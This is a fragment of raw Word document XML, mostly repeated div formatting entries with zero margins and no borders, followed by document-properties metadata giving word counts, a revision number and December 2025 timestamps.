        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="908541286">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="969625819">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1005979441">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1024788399">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1030574047">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1160731470">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1171915869">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1643533927">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1352755653">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="297027591">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="0"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                  <w:divsChild>
                    <w:div w:id="778985419">
                      <w:marLeft w:val="0"/>
                      <w:marRight w:val="0"/>
                      <w:marTop w:val="0"/>
                      <w:marBottom w:val="0"/>
                      <w:divBdr>
                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                      </w:divBdr>
                      <w:divsChild>
                        <w:div w:id="1625889581">
                          <w:marLeft w:val="0"/>
                          <w:marRight w:val="0"/>
                          <w:marTop w:val="0"/>
                          <w:marBottom w:val="0"/>
                          <w:divBdr>
                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                          </w:divBdr>
                          <w:divsChild>
                            <w:div w:id="6363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349880">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1236941838">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1252004850">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1256936838">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1382099859">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1382555997">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1487279451">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1523056949">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1608350953">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1647129847">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1660117031">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1809587602">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1815487769">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1840271121">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1894341091">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1949118914">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1976984250">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1991329175">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2058620644">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2060936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1</Pages>
  <Words>4770</Words>
  <Characters>27194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cp:lastModifiedBy>
  <cp:revision>9</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-12-09T00:58:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-12-24T07:52:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>